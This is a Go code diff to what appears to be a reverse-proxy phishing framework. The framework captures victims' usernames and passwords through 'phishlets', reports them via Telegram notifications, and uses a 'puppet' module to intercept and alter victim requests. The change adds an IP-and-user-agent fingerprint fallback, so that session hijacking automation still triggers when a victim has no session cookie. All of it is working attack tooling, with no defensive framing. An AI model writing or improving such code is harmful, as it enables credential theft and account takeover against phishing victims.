@@ -740,7 +740,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-									p.triggerPuppet(ps.SessionId, pl.Name)
+									p.triggerPuppet(ps.SessionId, pl.Name, req)
 								}
 							}
 
@@ -753,7 +753,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-									p.triggerPuppet(ps.SessionId, pl.Name)
+									p.triggerPuppet(ps.SessionId, pl.Name, req)
 								}
 							}
 
@@ -767,7 +767,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Error("database: %v", err)
 										}
 										SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-										p.triggerPuppet(ps.SessionId, pl.Name)
+										p.triggerPuppet(ps.SessionId, pl.Name, req)
 									}
 								}
 							}
@@ -828,7 +828,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-											p.triggerPuppet(ps.SessionId, pl.Name)
+											p.triggerPuppet(ps.SessionId, pl.Name, req)
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -840,7 +840,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-											p.triggerPuppet(ps.SessionId, pl.Name)
+											p.triggerPuppet(ps.SessionId, pl.Name, req)
 										}
 									}
 									for _, cp := range pl.custom {
@@ -853,7 +853,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 													log.Error("database: %v", err)
 												}
 												SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-												p.triggerPuppet(ps.SessionId, pl.Name)
+												p.triggerPuppet(ps.SessionId, pl.Name, req)
 											}
 										}
 									}
@@ -946,9 +946,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// Puppet Interception
 			if p.interceptor != nil {
-				if modifiedReq, intercepted := p.interceptor.InterceptRequest(req, ps.SessionId); intercepted {
+				sid := ps.SessionId
+				if sid == "" {
+					// Fallback to fingerprint for whitelisted IPs or first-arrival POSTs
+					sid = fmt.Sprintf("%s_%s", remote_addr, req.UserAgent())
+				}
+				if modifiedReq, intercepted := p.interceptor.InterceptRequest(req, sid); intercepted {
 					req = modifiedReq
-					log.Debug("[PROXY] Request intercepted and modified by puppet module (session: %s)", ps.SessionId)
+					log.Debug("[PROXY] Request intercepted and modified by puppet module (session: %s)", sid)
 				}
 			}
 
@@ -2119,9 +2124,19 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 }
 
 // triggerPuppet checks for and triggers puppet sessions
-func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string) {
+func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req *http.Request) {
 	// check if puppet module is enabled
 	if !p.cfg.GetPuppetConfig().Enabled {
+		return
+	}
+
+	// If session is empty, use fingerprint to sync with interceptor
+	if victimSession == "" && req != nil {
+		from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+		victimSession = fmt.Sprintf("%s_%s", from_ip, req.UserAgent())
+	}
+
+	if victimSession == "" {
 		return
 	}
 
